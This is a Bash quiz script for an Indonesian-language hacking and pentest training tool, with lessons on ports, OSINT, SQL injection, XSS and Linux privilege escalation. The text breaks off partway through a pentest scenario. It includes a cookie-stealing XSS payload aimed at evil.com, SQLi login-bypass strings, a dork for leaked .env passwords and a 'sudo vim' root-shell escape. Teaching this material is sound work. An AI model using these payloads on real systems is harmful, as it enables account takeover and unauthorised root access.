#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
DIM='\033[2m'
BOLD='\033[1m'
RESET='\033[0m'

BASEDIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
BASEDIR_MOD="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
if [ -z "$CYBERTUZ_LANG" ]; then
    source "$BASEDIR_MOD/lang.sh"
    ct_load_lang || _ct_set_lang "en"
fi

SAVEDIR="$BASEDIR/logs"
LATIHAN_SAVE="$SAVEDIR/latihan_progress.dat"
LATIHAN_SCORE="$SAVEDIR/latihan_scores.dat"

mkdir -p "$SAVEDIR"

jeda() {
    echo ""
    echo -ne "${DIM}  $CT_ENTER${RESET}"
    read -r
}

simpan_hasil() {
    local level="$1"
    local sesi="$2"
    local skor="$3"
    local total="$4"
    local status="$5"
    echo "$(date '+%Y-%m-%d %H:%M:%S')|$level|$sesi|$skor|$total|$status" >> "$LATIHAN_SCORE"
}

tandai_selesai() {
    local key="$1"
    grep -q "^$key$" "$LATIHAN_SAVE" 2>/dev/null || echo "$key" >> "$LATIHAN_SAVE"
}

sudah_selesai() {
    local key="$1"
    grep -q "^$key$" "$LATIHAN_SAVE" 2>/dev/null
}

header_level() {
    local level="$1"
    local judul="$2"
    local warna="$3"
    clear
    echo -e "${warna}"
    echo "  ╔══════════════════════════════════════════════════════════════╗"
    echo "  ║                  $CT_ARENA_HDR                   ║"
    echo "  ╚══════════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
    echo -e "  Level  : ${warna}${BOLD}$level${RESET}"
    echo -e "  Latihan: ${WHITE}$judul${RESET}"
    echo ""
    echo -e "${CYAN}  ----------------------------------------------------------------${RESET}"
    echo ""
}

benar() {
    echo -e "  ${GREEN}[$CT_CORRECT]${RESET} $1"
}

salah() {
    echo -e "  ${RED}[$CT_WRONG]${RESET} $1"
}

info() {
    echo -e "  ${CYAN}[$CT_INFO]${RESET}  $1"
}

peringatan() {
    echo -e "  ${YELLOW}[$CT_NOTE]${RESET}  $1"
}

tampil_skor() {
    local sc="$1"
    local tot="$2"
    local persen=$(( sc * 100 / tot ))
    echo ""
    echo -e "${CYAN}  ----------------------------------------------------------------${RESET}"
    echo -e "  Skor akhir: ${WHITE}${BOLD}$sc / $tot${RESET}  ($persen%)"
    if [ "$persen" -ge 80 ]; then
        echo -e "  Status    : ${GREEN}${BOLD}$CT_PASSED${RESET}"
        echo "$CT_PASSED"
    elif [ "$persen" -ge 50 ]; then
        echo -e "  Status    : ${YELLOW}$CT_ENOUGH - Ulangi untuk hasil lebih baik${RESET}"
        echo "$CT_ENOUGH"
    else
        echo -e "  Status    : ${RED}$CT_NOT_PASSED - Pelajari materi lagi${RESET}"
        echo "$CT_FAIL"
    fi
}


latihan_newbie_1() {
    header_level "$CT_LVL_NB - $CT_LEVEL 1" "Mengenal Jaringan & Port" "$GREEN"
    echo "  Ini adalah latihan pertama. Fokus pada pemahaman dasar"
    echo "  tentang jaringan, port, dan protokol."
    echo ""
    echo "  Instruksi: Jawab setiap pertanyaan dengan mengetik huruf"
    echo "  atau angka yang sesuai."
    jeda

    sc=0; tot=8

    clear
    header_level "$CT_LVL_NB - $CT_LEVEL 1" "Sesi 1 dari 3: Pengetahuan Port" "$GREEN"
    echo -e "  ${WHITE}Pertanyaan 1:${RESET}"
    echo "  Layanan FTP secara default menggunakan port berapa?"
    echo ""
    echo "  a) 20 dan 21"
    echo "  b) 22"
    echo "  c) 25"
    echo "  d) 80"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "a" ]]; then
        benar "FTP menggunakan port 21 (control) dan port 20 (data transfer)."
        ((sc++))
    else
        salah "Jawaban: a) Port 20 (data) dan 21 (control)."
    fi
    info "Port 21 untuk mengirim perintah, port 20 untuk transfer data aktif."
    echo ""

    echo -e "  ${WHITE}Pertanyaan 2:${RESET}"
    echo "  Protokol apa yang digunakan browser untuk akses website terenkripsi?"
    echo ""
    echo "  a) HTTP di port 80"
    echo "  b) HTTPS di port 443"
    echo "  c) FTP di port 21"
    echo "  d) SSH di port 22"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "HTTPS (HTTP Secure) berjalan di port 443 menggunakan TLS."
        ((sc++))
    else
        salah "Jawaban: b) HTTPS di port 443."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 3:${RESET}"
    echo "  Port 3306 biasanya digunakan oleh layanan apa?"
    echo ""
    echo "  a) Apache Web Server"
    echo "  b) SSH Remote Access"
    echo "  c) MySQL Database"
    echo "  d) DNS Server"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "c" ]]; then
        benar "MySQL database server secara default listen di port 3306."
        ((sc++))
    else
        salah "Jawaban: c) MySQL Database."
    fi
    info "Port database yang sering terbuka ke internet adalah celah umum."
    jeda

    clear
    header_level "$CT_LVL_NB - $CT_LEVEL 1" "Sesi 2 dari 3: TCP vs UDP" "$GREEN"

    echo -e "  ${WHITE}Pertanyaan 4:${RESET}"
    echo "  Mana pernyataan yang BENAR tentang UDP?"
    echo ""
    echo "  a) UDP lebih lambat dari TCP"
    echo "  b) UDP menjamin data sampai dengan urutan benar"
    echo "  c) UDP tidak membutuhkan handshake dan lebih cepat"
    echo "  d) UDP hanya dipakai untuk koneksi terenkripsi"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "c" ]]; then
        benar "UDP connectionless: langsung kirim tanpa setup, lebih cepat."
        ((sc++))
    else
        salah "Jawaban: c) UDP tidak perlu handshake, langsung kirim data."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 5:${RESET}"
    echo "  TCP Three-Way Handshake terdiri dari 3 langkah. Urutannya adalah?"
    echo ""
    echo "  a) ACK -> SYN -> SYN-ACK"
    echo "  b) SYN -> SYN-ACK -> ACK"
    echo "  c) SYN -> ACK -> FIN"
    echo "  d) CONNECT -> ACCEPT -> CONFIRM"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "SYN (client minta) -> SYN-ACK (server setuju) -> ACK (client konfirm)."
        ((sc++))
    else
        salah "Jawaban: b) SYN -> SYN-ACK -> ACK."
    fi
    jeda

    clear
    header_level "$CT_LVL_NB - $CT_LEVEL 1" "Sesi 3 dari 3: Praktek nmap Dasar" "$GREEN"
    echo "  Sekarang saatnya praktek langsung."
    echo "  Kita akan menggunakan nmap untuk scan target yang legal."
    echo ""
    echo "  Target resmi untuk latihan: scanme.nmap.org"
    echo ""

    echo -e "  ${WHITE}Pertanyaan 6:${RESET}"
    echo "  Perintah nmap yang paling dasar untuk scan satu host adalah?"
    echo ""
    echo -ne "  Ketik perintahnya: "
    read -r j
    if echo "$j" | grep -qE "^nmap [a-zA-Z0-9\.\-]"; then
        benar "Benar. Format dasar: nmap [target]"
        ((sc++))
    else
        salah "Jawaban: nmap scanme.nmap.org"
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 7:${RESET}"
    echo "  Flag apa yang dipakai nmap untuk mendeteksi versi service?"
    echo ""
    echo "  a) -v     b) -sV     c) -O     d) -A"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "-sV untuk version detection. Contoh: nmap -sV target"
        ((sc++))
    else
        salah "Jawaban: b) -sV (Service Version detection)"
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 8 - PRAKTEK NYATA:${RESET}"
    echo ""
    echo "  Coba jalankan scan nyata terhadap localhost."
    echo "  Perintah: nmap 127.0.0.1"
    echo ""
    echo -ne "  Jalankan perintah di atas, lalu ketik jumlah port yang open: "
    read -r j
    if command -v nmap &>/dev/null; then
        hasil=$(nmap 127.0.0.1 2>/dev/null | grep "open" | wc -l)
        echo ""
        echo -e "  ${CYAN}[$CT_INFO]${RESET} Hasil scan nyata: $hasil port open di localhost kamu."
        if [[ "$j" =~ ^[0-9]+$ ]]; then
            benar "Kamu sudah menjalankan scan nyata."
            ((sc++))
        fi
    else
        peringatan "nmap belum terinstall. Install: pkg install nmap"
        if [[ "$j" =~ ^[0-9]+$ ]]; then
            benar "Jawaban diterima. Install nmap untuk praktek langsung."
            ((sc++))
        fi
    fi

    echo ""
    status=$(tampil_skor $sc $tot | tail -1)
    simpan_hasil "$CT_LVL_NB" "Latihan-1" $sc $tot "$status"
    [ "$status" == "$CT_PASSED" ] && tandai_selesai "N1"
    jeda
}


latihan_newbie_2() {
    header_level "$CT_LVL_NB - $CT_LEVEL 2" "Reconnaissance & OSINT Dasar" "$GREEN"
    echo "  Level ini fokus pada teknik pengumpulan informasi secara pasif."
    echo "  Semua teknik yang dipelajari di sini adalah legal karena"
    echo "  menggunakan sumber informasi yang tersedia secara publik."
    jeda

    sc=0; tot=7

    clear
    header_level "$CT_LVL_NB - $CT_LEVEL 2" "Sesi 1: OSINT & Google Dorking" "$GREEN"

    echo -e "  ${WHITE}Pertanyaan 1:${RESET}"
    echo "  Google Dork operator apa yang membatasi pencarian hanya ke satu domain?"
    echo ""
    echo "  a) inurl:    b) filetype:    c) site:    d) intitle:"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "c" ]]; then
        benar "site:example.com -> hanya tampilkan hasil dari domain itu."
        ((sc++))
    else
        salah "Jawaban: c) site: (contoh: site:example.com)"
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 2:${RESET}"
    echo "  Kamu ingin cari file konfigurasi yang bocor di internet."
    echo "  Dork yang paling tepat adalah?"
    echo ""
    echo "  a) site:gov.id"
    echo "  b) filetype:env intext:DB_PASSWORD"
    echo "  c) intitle:admin login"
    echo "  d) inurl:index.php"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "filetype:env mencari file .env, intext:DB_PASSWORD filter isinya."
        ((sc++))
    else
        salah "Jawaban: b) filetype:env intext:DB_PASSWORD"
    fi
    info "File .env sering berisi credential database yang bocor ke internet."
    echo ""

    echo -e "  ${WHITE}Pertanyaan 3:${RESET}"
    echo "  WHOIS dapat memberikan informasi apa tentang sebuah domain?"
    echo ""
    echo "  a) Isi halaman website"
    echo "  b) Password admin website"
    echo "  c) Pemilik domain, registrar, tanggal expired, nameserver"
    echo "  d) Source code website"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "c" ]]; then
        benar "WHOIS memberikan data registrasi domain secara publik."
        ((sc++))
    else
        salah "Jawaban: c) Data registrasi domain."
    fi
    jeda

    clear
    header_level "$CT_LVL_NB - $CT_LEVEL 2" "Sesi 2: Praktek DNS & WHOIS" "$GREEN"

    echo -e "  ${WHITE}Latihan Praktek 4 - DNS Lookup:${RESET}"
    echo ""
    echo "  Jalankan perintah ini dan perhatikan hasilnya:"
    echo ""
    echo -e "  ${YELLOW}  nslookup google.com${RESET}"
    echo ""
    if command -v nslookup &>/dev/null; then
        echo -e "  ${CYAN}[$CT_INFO]${RESET}"
        nslookup google.com 2>/dev/null | grep -E "Address|Name" | head -6 | sed 's/^/  /'
    else
        echo "  (nslookup tidak tersedia, install: pkg install dnsutils)"
    fi
    echo ""
    echo -ne "  Berapa IP address yang dikembalikan untuk google.com? "
    read -r j
    if [[ "$j" =~ ^[1-9][0-9]*$ ]]; then
        benar "Google menggunakan banyak IP karena load balancing global."
        ((sc++))
    else
        salah "Masukkan angka jumlah IP yang muncul."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 5:${RESET}"
    echo "  DNS record type apa yang menyimpan alamat mail server untuk sebuah domain?"
    echo ""
    echo "  a) A record     b) CNAME record"
    echo "  c) MX record    d) TXT record"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "c" ]]; then
        benar "MX (Mail Exchange) record menentukan server email untuk domain."
        ((sc++))
    else
        salah "Jawaban: c) MX record."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 6:${RESET}"
    echo "  Shodan.io adalah search engine untuk apa?"
    echo ""
    echo "  a) Mencari konten website"
    echo "  b) Mencari device yang terhubung internet beserta port terbuka"
    echo "  c) Mencari alamat email"
    echo "  d) Mencari file yang bocor"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "Shodan scan dan index banner service dari semua IP di internet."
        ((sc++))
    else
        salah "Jawaban: b) Device yang terhubung internet."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 7 - Praktek Subdomain Probe:${RESET}"
    echo ""
    echo "  Kita akan coba probe subdomain umum secara manual."
    echo "  Perhatikan output perintah berikut:"
    echo ""
    dom="google.com"
    for sub in www mail ftp api; do
        result=$(nslookup "$sub.$dom" 2>/dev/null | grep "Address" | grep -v "#53" | head -1)
        if [ -n "$result" ]; then
            echo -e "  ${GREEN}  [FOUND]${RESET} $sub.$dom"
        fi
    done
    echo ""
    echo -ne "  Subdomain mana yang ditemukan? (ketik salah satu yang muncul di atas): "
    read -r j
    if [[ -n "$j" ]]; then
        benar "Kamu sudah memperhatikan hasil probe subdomain."
        ((sc++))
    fi

    echo ""
    status=$(tampil_skor $sc $tot | tail -1)
    simpan_hasil "$CT_LVL_NB" "Latihan-2" $sc $tot "$status"
    [ "$status" == "$CT_PASSED" ] && tandai_selesai "N2"
    jeda
}


latihan_intermediate_1() {
    header_level "$CT_LVL_INT - $CT_LEVEL 3" "Web Application Vulnerability" "$YELLOW"
    echo "  Di level ini kamu akan menganalisis kerentanan web secara mendalam."
    echo "  Semua simulasi dilakukan di environment yang aman dan terkontrol."
    echo ""
    echo -e "  ${YELLOW}  Prasyarat: selesaikan minimal 2 latihan level Newbie.${RESET}"
    jeda

    sc=0; tot=9

    clear
    header_level "$CT_LVL_INT - $CT_LEVEL 3" "Sesi 1: SQL Injection Analysis" "$YELLOW"

    echo "  Perhatikan kode PHP berikut:"
    echo ""
    echo -e "${RED}"
    echo '  $username = $_POST["username"];'
    echo '  $password = $_POST["password"];'
    echo '  $sql = "SELECT * FROM users WHERE username='"'"'".$username."'"'"' AND password='"'"'".$password."'"'"'";'
    echo '  $result = mysqli_query($conn, $sql);'
    echo -e "${RESET}"
    echo ""

    echo -e "  ${WHITE}Pertanyaan 1:${RESET}"
    echo "  Kode di atas rentan terhadap apa?"
    echo ""
    echo "  a) XSS       b) CSRF       c) SQL Injection       d) SSRF"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "c" ]]; then
        benar "Input langsung digabung ke SQL query tanpa sanitasi = SQLi."
        ((sc++))
    else
        salah "Jawaban: c) SQL Injection."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 2:${RESET}"
    echo "  Jika attacker memasukkan username: admin'-- "
    echo "  SQL yang terbentuk akan menjadi:"
    echo ""
    echo "  a) SELECT * FROM users WHERE username='admin' AND password='...'"
    echo "  b) SELECT * FROM users WHERE username='admin'-- AND password='...'"
    echo "  c) ERROR: syntax error"
    echo "  d) Query diblokir otomatis"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "Benar. Tanda -- membuat sisa query menjadi komentar SQL."
        benar "Artinya pengecekan password DIABAIKAN. Login berhasil tanpa password!"
        ((sc++))
    else
        salah "Jawaban: b) Bagian AND password=... menjadi komentar."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 3 - Simulasi:${RESET}"
    echo ""
    if command -v python3 &>/dev/null; then
        python3 << 'PYEOF'
import sqlite3

db = sqlite3.connect(":memory:")
db.execute("CREATE TABLE users (id INTEGER, username TEXT, password TEXT, role TEXT)")
db.execute("INSERT INTO users VALUES (1,'admin','S3cr3tP@ss','administrator')")
db.execute("INSERT INTO users VALUES (2,'user1','pass123','user')")
db.commit()

def coba_login(u, p):
    q = f"SELECT * FROM users WHERE username='{u}' AND password='{p}'"
    try:
        r = db.execute(q).fetchall()
        return r, q
    except Exception as e:
        return [], str(e)

print("  Simulasi database login berjalan.")
print()
print("  Test 1 - Login normal:")
r, q = coba_login("admin", "S3cr3tP@ss")
print(f"  Query: {q}")
print(f"  Hasil: {'LOGIN OK -> ' + str(r) if r else 'GAGAL'}")
print()
print("  Test 2 - SQL Injection:")
r, q = coba_login("admin'--", "salahpun")
print(f"  Query: {q}")
print(f"  Hasil: {'BYPASS! Data: ' + str(r) if r else 'GAGAL'}")
print()
print("  Test 3 - OR Injection:")
r, q = coba_login("' OR '1'='1", "' OR '1'='1")
print(f"  Query: {q}")
print(f"  Hasil: {'SEMUA DATA BOCOR! ' + str(r) if r else 'GAGAL'}")
PYEOF
    fi
    echo ""
    echo -ne "  Berdasarkan simulasi, payload mana yang berhasil bypass? (tulis semua): "
    read -r j
    if [[ -n "$j" ]]; then
        benar "Kamu sudah mengamati hasil simulasi SQLi."
        ((sc++))
    fi
    jeda

    clear
    header_level "$CT_LVL_INT - $CT_LEVEL 3" "Sesi 2: XSS Analysis" "$YELLOW"

    echo -e "  ${WHITE}Pertanyaan 4:${RESET}"
    echo "  Apa perbedaan Stored XSS dan Reflected XSS?"
    echo ""
    echo "  a) Stored disimpan di database, Reflected hanya di URL"
    echo "  b) Stored hanya di client, Reflected di server"
    echo "  c) Keduanya sama saja"
    echo "  d) Reflected lebih berbahaya dari Stored"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "a" ]]; then
        benar "Stored XSS jauh lebih berbahaya karena kena SEMUA pengunjung."
        ((sc++))
    else
        salah "Jawaban: a) Stored di DB (kena semua user), Reflected di URL (butuh klik link)."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 5:${RESET}"
    echo "  Filter menolak tag <script>. Payload XSS alternatif yang valid adalah?"
    echo ""
    echo "  a) [script]alert(1)[/script]"
    echo "  b) <img src=x onerror=alert(1)>"
    echo "  c) {alert(1)}"
    echo "  d) /script alert 1"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "<img onerror=> menggunakan event handler HTML, tidak butuh tag script."
        ((sc++))
    else
        salah "Jawaban: b) <img src=x onerror=alert(1)>"
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 6:${RESET}"
    echo "  Payload XSS ini tujuannya apa?"
    echo ""
    echo -e "  ${RED}  <script>document.location='http://evil.com/?c='+document.cookie</script>${RESET}"
    echo ""
    echo "  a) Crash browser korban"
    echo "  b) Mencuri session cookie korban dan kirim ke server attacker"
    echo "  c) Download file dari server"
    echo "  d) Mengubah tampilan halaman"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "document.cookie berisi session token. Jika dicuri, akun bisa diambil alih."
        ((sc++))
    else
        salah "Jawaban: b) Cookie theft untuk session hijacking."
    fi
    jeda

    clear
    header_level "$CT_LVL_INT - $CT_LEVEL 3" "Sesi 3: HTTP & Header Security" "$YELLOW"

    echo -e "  ${WHITE}Pertanyaan 7:${RESET}"
    echo "  Header HTTP apa yang WAJIB ada untuk mencegah Clickjacking?"
    echo ""
    echo "  a) Content-Type"
    echo "  b) X-Frame-Options: DENY"
    echo "  c) Authorization"
    echo "  d) Cache-Control"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "X-Frame-Options: DENY mencegah halaman di-embed dalam iframe."
        ((sc++))
    else
        salah "Jawaban: b) X-Frame-Options: DENY atau SAMEORIGIN."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 8:${RESET}"
    echo "  Kenapa flag HttpOnly pada cookie penting dari sisi security?"
    echo ""
    echo "  a) Membuat cookie hanya bisa dikirim via HTTPS"
    echo "  b) Mencegah JavaScript mengakses cookie (mitigasi XSS cookie theft)"
    echo "  c) Mengenkripsi isi cookie"
    echo "  d) Menghapus cookie saat browser ditutup"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "HttpOnly = JS tidak bisa baca cookie. Walau XSS berhasil, cookie aman."
        ((sc++))
    else
        salah "Jawaban: b) Mencegah JavaScript baca cookie."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 9 - Praktek Cek Header:${RESET}"
    echo ""
    if command -v curl &>/dev/null; then
        echo -e "  ${CYAN}[$CT_INFO]${RESET} Mengecek security header google.com..."
        echo ""
        headers=$(curl -sI --max-time 5 https://google.com 2>/dev/null)
        echo "$headers" | grep -iE "strict-transport|content-security|x-frame|x-content-type" | head -5 | sed 's/^/  /'
        echo ""
        echo -ne "  Apakah Strict-Transport-Security ada di header? (ya/tidak): "
        read -r j
        hsts=$(echo "$headers" | grep -i "strict-transport" | wc -l)
        if [[ "$hsts" -gt 0 && "${j,,}" == "ya" ]] || [[ "$hsts" -eq 0 && "${j,,}" == "tidak" ]]; then
            benar "Jawaban kamu sesuai dengan hasil live check."
            ((sc++))
        else
            salah "Cek kembali output di atas."
        fi
    else
        echo "  curl tidak tersedia."
        echo -ne "  Header HSTS berguna untuk apa? (ketik jawaban singkat): "
        read -r j
        if echo "${j,,}" | grep -qE "https|paksa|redirect|http"; then
            benar "HSTS memaksa browser selalu gunakan HTTPS."
            ((sc++))
        else
            salah "HSTS = memaksa koneksi HTTPS, cegah SSL stripping."
        fi
    fi

    echo ""
    status=$(tampil_skor $sc $tot | tail -1)
    simpan_hasil "$CT_LVL_INT" "Latihan-3" $sc $tot "$status"
    [ "$status" == "$CT_PASSED" ] && tandai_selesai "I1"
    jeda
}


latihan_intermediate_2() {
    header_level "$CT_LVL_INT - $CT_LEVEL 4" "Linux Security & Privilege Escalation" "$YELLOW"
    echo "  Di level ini kamu akan belajar menganalisis keamanan sistem Linux"
    echo "  dan teknik-teknik privilege escalation yang umum digunakan."
    jeda

    sc=0; tot=8

    clear
    header_level "$CT_LVL_INT - $CT_LEVEL 4" "Sesi 1: File Permission Analysis" "$YELLOW"

    echo "  Perhatikan output ls -la berikut:"
    echo ""
    echo -e "${DIM}"
    echo "  -rwsr-xr-x 1 root root 68208 Jan 1  2024 /usr/bin/passwd"
    echo "  -rwxr-xr-x 1 root root 37016 Jan 1  2024 /usr/bin/cat"
    echo "  -rwsr-sr-x 1 root root 14328 Jan 1  2024 /usr/bin/crontab"
    echo "  drwxrwxrwt 8 root root  4096 Jan 1  2024 /tmp"
    echo "  -rw------- 1 root root   848 Jan 1  2024 /etc/shadow"
    echo -e "${RESET}"
    echo ""

    echo -e "  ${WHITE}Pertanyaan 1:${RESET}"
    echo "  File /usr/bin/passwd memiliki permission -rwsr-xr-x."
    echo "  Huruf 's' pada posisi execute owner artinya apa?"
    echo ""
    echo "  a) File bisa dieksekusi semua orang"
    echo "  b) SUID bit - file berjalan dengan privilege pemilik file (root)"
    echo "  c) File adalah symbolic link"
    echo "  d) File terenkripsi"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "SUID bit membuat file berjalan sebagai owner-nya (root)."
        benar "Inilah kenapa user biasa bisa ganti password sendiri via /usr/bin/passwd."
        ((sc++))
    else
        salah "Jawaban: b) SUID - Set User ID bit."
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 2:${RESET}"
    echo "  Sebagai pentester yang sudah dapat akses user biasa,"
    echo "  perintah apa yang pertama kali kamu jalankan untuk cari SUID files?"
    echo ""
    echo "  a) ls -la /"
    echo "  b) find / -perm -4000 -type f 2>/dev/null"
    echo "  c) cat /etc/passwd"
    echo "  d) ps aux"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "find / -perm -4000 mencari semua file dengan SUID bit aktif."
        ((sc++))
    else
        salah "Jawaban: b) find / -perm -4000 -type f 2>/dev/null"
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 3 - Live Demo:${RESET}"
    echo ""
    echo "  Menjalankan: find /usr/bin -perm -4000 -type f 2>/dev/null"
    echo ""
    find /usr/bin /bin 2>/dev/null -perm -4000 -type f 2>/dev/null | head -8 | sed 's/^/  /'
    echo ""
    echo -ne "  Ada berapa file SUID yang ditemukan di /usr/bin dan /bin? "
    read -r j
    if [[ "$j" =~ ^[0-9]+$ ]]; then
        benar "Setiap SUID binary harus dicek apakah bisa dieksploitasi di GTFOBins."
        ((sc++))
    else
        salah "Masukkan angka."
    fi
    jeda

    clear
    header_level "$CT_LVL_INT - $CT_LEVEL 4" "Sesi 2: Post-Exploitation Enum" "$YELLOW"

    echo -e "  ${WHITE}Pertanyaan 4:${RESET}"
    echo "  Setelah dapat shell di sistem target, perintah apa untuk"
    echo "  melihat apa yang boleh dilakukan user ini dengan sudo?"
    echo ""
    echo "  a) cat /etc/sudoers"
    echo "  b) sudo -l"
    echo "  c) id"
    echo "  d) whoami"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "sudo -l menampilkan daftar command yang bisa dijalankan sebagai sudo."
        ((sc++))
    else
        salah "Jawaban: b) sudo -l"
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 5:${RESET}"
    echo "  Kamu menemukan output sudo -l menampilkan:"
    echo ""
    echo -e "  ${YELLOW}  (ALL) NOPASSWD: /usr/bin/vim${RESET}"
    echo ""
    echo "  Apa artinya dan bagaimana cara eskalasi privilege?"
    echo ""
    echo "  a) Tidak berbahaya, vim hanya text editor"
    echo "  b) Bisa jalankan vim sebagai root, lalu dari vim buka shell root"
    echo "  c) Bisa edit file manapun saja"
    echo "  d) Harus cari cara lain"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "sudo vim -c ':!/bin/bash' -> shell root langsung dari vim!"
        benar "Referensi: gtfobins.github.io/gtfobins/vim/"
        ((sc++))
    else
        salah "Jawaban: b) vim bisa spawn shell: sudo vim -c ':!/bin/bash'"
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 6:${RESET}"
    echo "  Di mana hash password user Linux disimpan?"
    echo ""
    echo "  a) /etc/passwd"
    echo "  b) /etc/users"
    echo "  c) /etc/shadow"
    echo "  d) /home/.passwords"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "c" ]]; then
        benar "/etc/shadow hanya bisa dibaca root. Berisi hash password semua user."
        ((sc++))
    else
        salah "Jawaban: c) /etc/shadow"
    fi
    jeda

    clear
    header_level "$CT_LVL_INT - $CT_LEVEL 4" "Sesi 3: Live System Enum" "$YELLOW"

    echo "  Menjalankan enumerasi sistem nyata..."
    echo ""

    echo -e "  ${CYAN}[USER INFO]${RESET}"
    id | sed 's/^/  /'
    echo ""

    echo -e "  ${CYAN}[SUDO RIGHTS]${RESET}"
    sudo -l 2>/dev/null | head -5 | sed 's/^/  /' || echo "  (tidak ada sudo atau butuh password)"
    echo ""

    echo -e "  ${CYAN}[LISTENING PORTS]${RESET}"
    ss -tlnp 2>/dev/null | head -8 | sed 's/^/  /' || netstat -tlnp 2>/dev/null | head -8 | sed 's/^/  /'
    echo ""

    echo -e "  ${WHITE}Pertanyaan 7:${RESET}"
    echo -ne "  Dari output di atas, apakah ada port yang listening? (ya/tidak): "
    read -r j
    if [[ "${j,,}" == "ya" || "${j,,}" == "tidak" ]]; then
        benar "Kamu sudah menganalisis output enumerasi sistem."
        ((sc++))
    fi
    echo ""

    echo -e "  ${WHITE}Pertanyaan 8:${RESET}"
    echo "  LinPEAS adalah tool untuk apa?"
    echo ""
    echo "  a) Scanning port jaringan"
    echo "  b) Otomasi enumerasi Linux untuk temukan vektor privilege escalation"
    echo "  c) Cracking password hash"
    echo "  d) Intercept HTTP traffic"
    echo ""
    echo -ne "  Jawab: "
    read -r j
    if [[ "${j,,}" == "b" ]]; then
        benar "LinPEAS = Linux Privilege Escalation Awesome Script."
        benar "Download: https://github.com/carlospolop/PEASS-ng"
        ((sc++))
    else
        salah "Jawaban: b) Otomasi enumerasi untuk privilege escalation."
    fi

    echo ""
    status=$(tampil_skor $sc $tot | tail -1)
    simpan_hasil "$CT_LVL_INT" "Latihan-4" $sc $tot "$status"
    [ "$status" == "$CT_PASSED" ] && tandai_selesai "I2"
    jeda
}


latihan_advanced_1() {
    header_level "$CT_LVL_ADV - $CT_LEVEL 5" "Full Pentest Scenario: Web App" "$RED"
    echo "  Selamat datang di level Advanced."
    echo "  Di sini kamu akan menghadapi skenario pentest realistis."
    echo "  Tidak ada jawaban pilihan ganda. Kamu harus berpikir seperti pentester."
    echo ""
    echo -e "  ${RED}  Level ini membutuhkan pemahaman mendalam dari level sebelumnya.${RESET}"
    jeda

    sc=0; tot=7

    clear
    header_level "$CT_LVL_ADV - $CT_LEVEL 5" "Skenario: Target Web Application" "$RED"
    echo "  BRIEFING:"
    echo ""
    echo "  Kamu mendapat kontrak pentest terhadap aplikasi web fiktif:"
    echo "  Target: http://vuln-app.internal (simulasi)"
    echo "  Scope: Full application testing"
    echo "  Tujuan: temukan semua vulnerability, dokumentasikan, beri rekomendasi"
    echo ""
    echo "  Ikuti langkah-langkah metodologi pentest yang benar."
    jeda

    clear
    header_level "$CT_LVL_ADV - $CT_LEVEL 5" "Fase 1: Reconnaissance" "$RED"

    echo -e "  ${WHITE}Langkah 1 - Information Gathering:${RESET}"
    echo ""
    echo "  Kamu memeriksa website target dan menemukan:"
    echo "  - Server: Apache/2.4.41 (dari header Server:)"
    echo "  - X-Powered-By: PHP/7.2.24"
    echo "  - Ada form login di /admin/login.php"
    echo "  - robots.txt berisi: Disallow: /backup/"
    echo ""

